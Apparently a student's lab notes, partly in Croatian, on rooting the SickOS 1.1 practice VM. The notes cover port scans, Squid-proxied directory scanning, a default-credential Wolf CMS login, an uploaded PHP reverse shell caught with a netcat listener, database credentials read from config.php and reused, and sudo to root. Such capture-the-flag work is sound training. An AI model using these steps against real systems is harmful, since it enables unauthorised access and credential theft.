10.224.72.146

nmap -T4 -p- -A 10.224.72.146
 --> nista

nmap -Pn 10.224.72.146
Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-26 09:23 CEST
Nmap scan report for 10.224.72.146
Host is up (0.00034s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
3128/tcp open   squid-http
8080/tcp closed http-proxy

Nmap done: 1 IP address (1 host up) scanned in 6.39 seconds

nikto -h http://10.224.72.146
 --> nista posebno

nikto -h http://10.224.72.146:3128
+ Server: squid/3.1.19
+ Retrieved via header: 1.0 localhost (squid/3.1.19)
....

 --> ne mogu uci na web stranicu i dirbuster ne pokazuje nista zbog toga

 --> metasploit?

msfconsole

msf5 auxiliary(scanner/http/squid_pivot_scanning) > options

Module options (auxiliary/scanner/http/squid_pivot_scanning):

   Name          Current Setting                                  Required  Description
   ----          ---------------                                  --------  -----------
   CANARY_IP     1.2.3.4                                          yes       The IP to check if the proxy always answers positively; the IP should not respond.
   MANUAL_CHECK  true                                             yes       Stop the scan if server seems to answer positively to every request
   PORTS         21,80,139,443,445,1433,1521,1723,3389,8080,9100  yes       Ports to scan; must be TCP
   Proxies                                                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RANGE         10.224.72.146                                    yes       IPs to scan through Squid proxy
   RHOSTS        10.224.72.146                                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         3128                                             yes       The target port (TCP)
   SSL           false                                            no        Negotiate SSL/TLS for outgoing connections
   THREADS       1                                                yes       The number of concurrent threads (max one per host)
   VHOST                                                          no        HTTP server virtual host

msf5 auxiliary(scanner/http/squid_pivot_scanning) > run

[+] [10.224.72.146] 10.224.72.146 is alive but 21 is CLOSED
[+] [10.224.72.146] 10.224.72.146:80 seems OPEN
[+] [10.224.72.146] 10.224.72.146 is alive but 139 is CLOSED
[+] [10.224.72.146] 10.224.72.146 is alive but 445 is CLOSED
[+] [10.224.72.146] 10.224.72.146 is alive but 1433 is CLOSED
[+] [10.224.72.146] 10.224.72.146 is alive but 1521 is CLOSED
[+] [10.224.72.146] 10.224.72.146 is alive but 1723 is CLOSED
[+] [10.224.72.146] 10.224.72.146 is alive but 3389 is CLOSED
[+] [10.224.72.146] 10.224.72.146 is alive but 8080 is CLOSED
[+] [10.224.72.146] 10.224.72.146 is alive but 9100 is CLOSED
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

changed proxy on firefox to our ip address and 3128 port

went to the ip website and got " BLEHHH!!!"

changed the proxy in dirbuster and started the scan, 
but everything under /cgi-bin/status was found so dirbuster slowed the machine down
 --> just stopped the search

used dirb and found this:
knujic@seclab:~/Documents$ dirb http://10.224.72.146 -p 10.224.72.146:3128

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Jul 26 10:50:23 2022
URL_BASE: http://10.224.72.146/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
PROXY: 10.224.72.146:3128

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.224.72.146/ ----
+ http://10.224.72.146/.bash_history (CODE:200|SIZE:2453)                                                                                                                                 
==> DIRECTORY: http://10.224.72.146/.ssh/                                                                                                                                                 
+ http://10.224.72.146/cgi-bin/ (CODE:403|SIZE:289)                                                                                                                                       
+ http://10.224.72.146/connect (CODE:200|SIZE:333)                                                                                                                                        
+ http://10.224.72.146/index (CODE:200|SIZE:21)                                                                                                                                           
+ http://10.224.72.146/index.php (CODE:200|SIZE:21)                                                                                                                                       
+ http://10.224.72.146/robots (CODE:200|SIZE:45)                                                                                                                                          
+ http://10.224.72.146/robots.txt (CODE:200|SIZE:45)                                                                                                                                      
+ http://10.224.72.146/server-status (CODE:403|SIZE:294)                                                                                                                                  
                                                                                                                                                                                          
---- Entering directory: http://10.224.72.146/.ssh/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Tue Jul 26 10:50:26 2022
DOWNLOADED: 4612 - FOUND: 8

found in the robots file that there is a hidden cms, 
followed steps on this link: https://chousensha.github.io/blog/2017/06/28/sickos-1-dot-1-writeup/

logged in with admin admin

found php-reverse-shell code, changed ip address and port there

we used the wrong ip address so nothing happened, when we changed it something finally happened on the listener
http://10.224.72.146/wolfcms/public/php-reverse-shell.php

when we went to this webpage with the wrong ip this was the output:
WARNING: Failed to daemonise. This is quite common and not fatal. Network is unreachable (101) 


listener:
nc -vnlp 8765

then we went to the webpage:
http://10.224.72.146/wolfcms/public/php-reverse-shell.php

now we are connected to the victims pc

found a config.php file in /var/www/wolfcms

// Database settings:
define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
define('DB_USER', 'root');
define('DB_PASS', 'john@123');

couldn't log in as root so signed in as sickos (saw that user exist when checked the home directory)
pass: john@123

sickos@SickOs:~$ sudo -l
[sudo] password for sickos: 

sudo su

root@SickOs:~# whoami
root


root@SickOs:~# ls
a0216ea4d51874464078c618298b1367.txt
root@SickOs:~# cat a0216ea4d51874464078c618298b1367.txt 
If you are viewing this!!

ROOT!

You have Succesfully completed SickOS1.1.
Thanks for Trying


